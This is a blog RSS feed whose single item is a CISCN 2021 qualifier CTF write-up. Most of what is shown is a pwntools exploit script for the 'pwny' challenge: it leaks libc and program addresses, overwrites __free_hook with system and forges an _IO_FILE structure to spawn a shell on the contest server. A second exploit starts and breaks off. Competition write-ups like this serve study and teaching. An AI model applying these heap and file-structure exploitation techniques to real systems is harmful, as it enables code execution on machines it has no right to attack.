<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>wh1sper</title>
        <link>https://anthem-whisper.github.io/</link>
        <description>Recent content on wh1sper</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <lastBuildDate>Sun, 16 May 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>CISCN 2021 Quals Writeup by X1cT34m</title>
        <link>https://anthem-whisper.github.io/p/ciscn-2021-quals-writeup-by-x1ct34m/</link>
        <pubDate>Sun, 16 May 2021 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/ciscn-2021-quals-writeup-by-x1ct34m/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed/img/20210516174112.jpg" alt="Featured image of post CISCN 2021 Quals Writeup by X1cT34m" /&gt;&lt;h2 id=&#34;pwn&#34;&gt;Pwn&lt;/h2&gt;
&lt;h3 id=&#34;pwny&#34;&gt;pwny&lt;/h3&gt;
&lt;p&gt;越界任意写&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;choice:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;process&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./main&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ELF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;./libc-2.27.so&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;124.70.35.238&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;23807&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Index:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;256&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Index:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;256&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Index:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xFFFFFFFFFFFFFFFF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Result: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_IO_2_1_stdout_&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;LIBC:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Index:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;11&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xFFFFFFFFFFFFFFFF&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recvuntil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Result: &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;proc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x202008&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;info&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PROC:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;hex&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;proc_base&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;free_hook&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;__free_hook&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;L&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x202060&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;free_hook&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Index:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;IO_list_all&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_IO_list_all&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;IO_str_jumps&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x3E8360&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;fake_IO_FILE&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;fake_IO_FILE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;fake_IO_FILE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;fake_IO_FILE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;search&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;/bin/sh&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;fake_IO_FILE&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fake_IO_FILE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ljust&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xD8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;fake_IO_FILE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;IO_str_jumps&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;fake_IO_FILE&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p64&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;


&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;libc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sym&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;_IO_2_1_stderr_&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;L&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;proc_base&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x202060&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;stderr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;L&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xE8&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Index:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;((&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)))&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;send&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;fake_IO_FILE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)])&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;lonelywolf&#34;&gt;lonelywolf&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendlineafter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;choice:&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ch&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
	&lt;span class=&#34;n&#34;&gt;menu&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
